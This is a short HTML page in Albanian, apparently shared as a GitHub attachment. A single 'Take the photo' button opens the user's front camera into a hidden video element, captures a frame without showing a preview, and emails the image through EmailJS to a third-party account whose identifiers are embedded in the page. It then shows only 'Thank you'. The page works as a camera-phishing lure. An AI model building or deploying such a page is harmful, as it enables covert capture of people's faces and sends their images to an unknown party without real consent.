[index.html](https://github.com/user-attachments/files/24318480/index.html)
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Bëj Fotografinë</title>
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
(function(){
   emailjs.init("kLGUY8n66htft0_xj"); // PUBLIC_KEY yt
})();
</script>
</head>
<body>

<h2 style="text-align:center;">Kliko butonin për të bërë foto</h2>
<button id="clickMe" style="font-size:20px;padding:15px;display:block;margin:auto;">Bëj Fotografinë</button>
<video id="video" autoplay playsinline style="display:none"></video>

<script>
const btn = document.getElementById("clickMe");
const video = document.getElementById("video");

btn.onclick = async () => {
    btn.disabled = true;

    // Hap kamera përpara
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    video.srcObject = stream;

    // Prit 1 sekondë që kamera të stabilizohet
    setTimeout(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video,0,0);
        const foto = canvas.toDataURL("image/jpeg");

        // Ndalo kamerën
        stream.getTracks().forEach(t => t.stop());

        // Dërgo në EmailJS
        emailjs.send("service_9brdqt6", "template_1zhckp9", {foto: foto})
        .then(res => alert("Foto dërguar! ✅"))
        .catch(err => alert("Gabim: " + err));

        document.body.innerHTML = "<h2 style='text-align:center;'>Faleminderit!</h2>";

    }, 1000);
};
</script>

</body>
</html>
